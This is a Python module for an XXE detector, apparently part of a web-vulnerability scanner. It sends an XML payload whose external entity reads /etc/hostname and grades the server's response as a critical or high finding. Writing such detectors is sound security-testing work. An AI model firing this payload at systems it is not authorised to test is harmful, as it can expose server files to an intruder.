"""XXE detection — external entity injection."""

import xml.etree.ElementTree as ET
from webbreach.engines import BaseEngine
from webbreach.findings import Finding, Severity


class XXEEngine(BaseEngine):
    name = "xxe"
    description = "XML External Entity injection detector"

    def _scan(self) -> list[Finding]:
        findings: list[Finding] = []
        url = f"{self.target_url}/xxe"

        # Payload that attempts to read /etc/hostname
        xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root><data>&xxe;</data></root>'

        status, body, _ = self._post(url, xxe_payload, content_type="application/xml")

        # Check if server processed the XML and returned entity content
        if status == 200:
            try:
                data = __import__("json").loads(body)
                # Server parsed entities successfully
                if "entities" in data or (isinstance(data.get("data"), list) and len(data["data"]) > 0):
                    findings.append(self._finding(
                        severity=Severity.CRITICAL,
                        title="XXE — external entity processed",
                        method="POST",
                        evidence=body[:300],
                        payload=xxe_payload[:100],
                    ))
                # Server returned error about entity (shows it tried to process)
                elif "error" in data and "entity" in data["error"].lower():
                    findings.append(self._finding(
                        severity=Severity.HIGH,
                        title="XXE — entity processing attempted",
                        method="POST",
                        evidence=body[:300],
                        payload=xxe_payload[:100],
                    ))
            except Exception:
                pass

        return findings
